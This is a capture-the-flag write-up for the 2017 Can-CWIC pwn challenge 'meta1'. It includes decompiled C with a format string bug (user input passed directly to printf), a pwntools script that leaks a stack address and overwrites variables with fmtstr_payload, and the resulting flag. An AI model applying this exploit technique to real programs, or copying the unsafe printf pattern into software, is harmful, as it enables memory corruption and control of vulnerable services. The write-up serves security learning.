# [2017_Can-CWIC] \[PWN] meta1

## Key words

- Format String Bug

## Problem

```
We know how to program and our flags are for geniuses.

nc 159.203.38.169 5685
```

##Analysis

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-224h]
  char s; // [esp+4h] [ebp-220h]
  char *v6; // [esp+204h] [ebp-20h]
  int v7; // [esp+208h] [ebp-1Ch]
  int v8; // [esp+20Ch] [ebp-18h]
  int v9; // [esp+210h] [ebp-14h]
  int *v10; // [esp+214h] [ebp-10h]
  int n; // [esp+218h] [ebp-Ch]
  int *v12; // [esp+21Ch] [ebp-8h]

  v12 = &argc;
  n = 32;
  v4 = 0;
  v10 = &v4;
  v9 = 2017;
  v8 = 0;
  v7 = 0;
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  puts(
    "Here is our special metaprogramming quiz program. It is entirely coded by hand. We might even have forgotten some as"
    "signments somewhere but it should still work fine.\n");
  while ( !v4 )
  {
    puts("How many times have you seen the meta?");
    v6 = fgets(&s, 32, stdin);
    if ( !v6 )
      return 0;
    puts("Your answer was: ");
    printf(&s);
    if ( !v4 )
      puts("\nWrong... we know...");
  }
  puts("\nGood Job! Now, in what year did IBM demonstrate using code as data?\n>");
  fgets(&s, 32, stdin);
  puts("Your answer was: ");
  printf(&s);
  if ( v9 == 1948 )
  {
    puts(
      "\n"
      "We might be able to work something out... in what year was this year's CCWC? Also, on a scale of 0x00 to 0xffff, w"
      "hat would you rate its metaprogramming quiz?\n"
      ">");
    fgets(&s, n, stdin);
    puts("Your answer was: ");
    printf(&s);
    if ( v8 == 2017 && v7 == 0xFFFF )
      puts("Congrats on winning the metaprogramming quiz! FLAG{11111111111111111111111111111111111}");
    result = 0;
  }
  else
  {
    puts("\nWrong again... You are useless. cya.");
    result = 1;
  }
  return result;
}
```

FSB 취약점을 통해 변수들을 조작할 수 있고 이를 통해 flag가 출력되는 분기문으로 들어갈 수 있습니다.

## Exploit

```python
from pwn import *

context.clear(arch='i386')

#p = process("./meta")
p = remote("159.203.38.169", 5685)
print p.recvuntil("How many times have you seen the meta?\n")
p.sendline("%38$x")
print p.recvuntil("Your answer was: \n")
leaked_stack = int(p.recvline()[:-1],16)
v4 = leaked_stack - 216
v9 = v4 + 528
v8 = v4 + 524
v7 = v4 + 520

payload = fmtstr_payload(6, {v9: 1948}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v8: 2017}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v7: 0xffff}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v4: 0x1}, write_size='short')
p.sendline(payload)
p.recv()

log.info("leaked stack addr : " + hex(leaked_stack))
log.info("v4 addr : "+ hex(v4))
log.info("v9 addr : "+ hex(v9))
log.info("v8 addr : "+ hex(v8))
log.info("v7 addr : "+ hex(v7))
p.interactive()
```

## Result

```
Good Job! Now, in what year did IBM demonstrate using code as data?
>
Your answer was: 
n

We might be able to work something out... in what year was this year's CCWC? Also, on a scale of 0x00 to 0xffff, what would you rate its metaprogramming quiz?
>
$ 
Your answer was: 

Congrats on winning the metaprogramming quiz! FLAG{1_4M_VerY_f0rm@tab7e_&&_s0_4dOr4bl3}
[*] Got EOF while reading in interactive
```

